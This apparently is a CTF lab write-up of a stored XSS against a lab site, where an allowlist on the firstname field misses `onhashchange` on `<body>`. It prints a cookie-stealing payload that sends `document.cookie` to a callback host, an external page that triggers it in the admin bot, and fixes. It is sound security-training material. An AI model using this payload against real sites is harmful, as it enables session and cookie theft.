# Hashology Pwnbox Lab - Body onhashchange Allowlist XSS

Date: 2026-07-10
Target type: CTF/lab
Host: `https://561d9d626705.pwnbox-lab.com/`
Bug class: Stored XSS via incomplete HTML allowlist, missed event handler (`onhashchange`), admin ticket bot cookie exfil

## Observation

Social platform branded **Hashology**.

About copy:

```text
A simple social platform where users create profiles and add a short bio.
Some tags are in allowlist… but do you really think could you reach XSS?
the admin has some useful cookies, can you get them?
```

Surface after register/login:

- Session cookie: `connect.sid` (HttpOnly)
- Routes: `/dashboard`, `/profile/<username>`, `/editprofile`, `/ticket`
- Profile fields: firstname, lastname, bio
- Ticket form: message + **URL to Review** (admin bot visits the URL)
- CSP: `frame-ancestors 'none'`
- Profile page stub:

```js
window.addEventListener('hashchange', (e) => {
  console.log('Hash changed to:', location.hash);
});
```

## Hypothesis

Bio mentions an HTML allowlist. Firstname/lastname/bio may be sanitized differently. The hashchange stub looks like a PortSwigger jQuery hashchange red herring. Real XSS is likely an allowlist miss that still needs a hash change to fire, delivered through the ticket bot.

## Evidence

### Field sanitization (user view)

| Field | Behavior |
|-------|----------|
| firstname | Tags stripped or filtered; `[removed]`-style cleaning for some payloads; **`<body>` kept as raw HTML** |
| lastname | HTML escaped |
| bio | HTML escaped for user view |
| username | Escaped in UI |

Confirmed firstname keep:

```html
<body>SAFE</body>
```

Most event handlers on `<body>` were stripped (`onload`, `onclick`, `onfocus`, `onpageshow`, …).

Confirmed miss:

```html
<body onhashchange="alert(1)">X</body>
```

Survived storage and reflection in `#firstname`.

### Bot behavior

- Ticket URL field: bot visits external URLs (HeadlessChrome; OAST confirmed).
- Ticket message HTML: not rendered as XSS for the bot (message-only OAST probes never hit).
- Bio `<img src=OAST>`: no hit when bot visited profile (escaped for admin too, or not executed).
- Framing lab pages blocked by `frame-ancestors 'none'`; `window.open` + hash set worked from external exploit host.

### Failed assumptions

1. Classic jQuery `$()` + hashchange — no jQuery on page; stub only logs.
2. Bio allowlist renders live HTML for users/admin — bio escaped.
3. Ticket message stored XSS — bot only navigates the URL field.
4. Common handlers (`onload`, `onerror`, `onclick`) on allowlisted tags — stripped.
5. Direct cookie steal from attacker origin — only attacker-page cookies; lab `connect.sid` is HttpOnly. Flag lived in a separate non-HttpOnly admin cookie.

## Working theory

1. Store `<body onhashchange=...>` in firstname.
2. Host external page that `window.open`s the attacker profile, then sets `location.hash`.
3. Submit exploit URL via `/ticket`.
4. Bot loads profile → hash change → handler runs on lab origin → exfil `document.cookie`.

## Test

Stored firstname (placeholder callback):

```html
<body onhashchange="new Image().src='https://[oast]/c?'+encodeURIComponent(document.cookie)">X</body>
```

External trigger page:

```html
<script>
const lab = 'https://[host]/profile/[attacker]';
const w = window.open(lab);
setTimeout(() => { w.location = lab + '#pwn'; }, 2500);
</script>
```

Submit ticket URL = external host.

## Result

OAST received cookie exfil containing admin `flag=pwnbox{...}` (non-HttpOnly). Session `connect.sid` remained HttpOnly and was not needed for the flag.

## Root cause

HTML allowlist for firstname permits `<body>` and fails to strip `onhashchange`. Combined with an external page that can change the hash of an opened profile tab, this becomes stored XSS in the admin bot browser.

## Fix

- Prefer output encoding over allowlists for plain profile fields.
- If rich HTML is required: strict allowlist of safe tags/attrs only; strip **all** `on*` handlers and dangerous schemes.
- Explicitly deny `body`/`html`/`head` in user content.
- Prefer HttpOnly for any secret cookies; do not put flags in JS-readable cookies.

## Reusable outputs

- `writeups/hashology-body-onhashchange-allowlist-xss.md`
- `notes/html-allowlist-body-onhashchange-xss.md`
- `payloads/xss/body-onhashchange-allowlist-bot.md`
